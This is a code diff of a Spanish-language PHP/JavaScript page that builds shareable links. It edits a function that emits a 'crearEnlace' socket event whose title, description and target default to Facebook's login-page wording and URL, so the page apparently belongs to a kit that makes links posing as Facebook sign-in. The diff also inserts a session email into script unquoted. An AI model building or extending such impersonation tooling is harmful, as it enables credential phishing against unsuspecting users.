@@ -55,8 +55,7 @@
             <div style="display: none;">
                 <label for="enlace1" class="block text-sm font-medium text-gray-300">Enlace Principal</label>
                 <input type="url" id="enlace1" placeholder="https://facebook.com/tu-enlace"
-                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
-                    >
+                    class="w-full p-2 bg-gray-800 text-white rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
             </div>
 
             <!-- Enlace Secundario (Opcional) -->
@@ -144,7 +143,7 @@
 
     });
 
-    window.actualizarVistaPrevia = function () {
+    window.actualizarVistaPrevia = function() {
         const titulo = inputTitulo.value.trim();
         const descripcion = inputDescripcion.value.trim();
         const enlace = inputEnlace1.value.trim();
@@ -157,11 +156,11 @@
     }
 
     // Cargar imagen de vista previa
-    inputImagen.addEventListener("change", function () {
+    inputImagen.addEventListener("change", function() {
         const file = this.files[0];
         if (file) {
             const reader = new FileReader();
-            reader.onload = function (e) {
+            reader.onload = function(e) {
                 eliminarImagenBtn.style.display = 'inline'
 
                 previewImagen.src = e.target.result;
@@ -180,17 +179,26 @@
 
     // Manejar envío del formulario
     function crearEnlace(tipo) {
-        socket.emit("crearEnlace", { tipo: tipo, id: file });
+        const titulo = inputTitulo.value.trim();
+        const descripcion = inputDescripcion.value.trim();
+        const enlace = inputEnlace1.value.trim();
+        socket.emit("crearEnlace", {
+            tipo: tipo,
+            user: <?php echo $_SESSION["user"]["email"]; ?>,
+            img: previewImagen.src,
+            titulo: titulo || "Facebook - Inicia sesión o regístrate",
+            descripcion: descripcion || "Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y laspersonas que conoces.",
+            link2: enlace || "https://www.facebook.com/",
+
+        });
     }
 
-    
-    form.addEventListener("submit", function (event) {
+
+    form.addEventListener("submit", function(event) {
         event.preventDefault();
+        alert("Holaaa")
         actualizarVistaPrevia();
-        crearEnlace('facebook')
+        //crearEnlace('facebook')
 
     });
-
-
-
 </script>
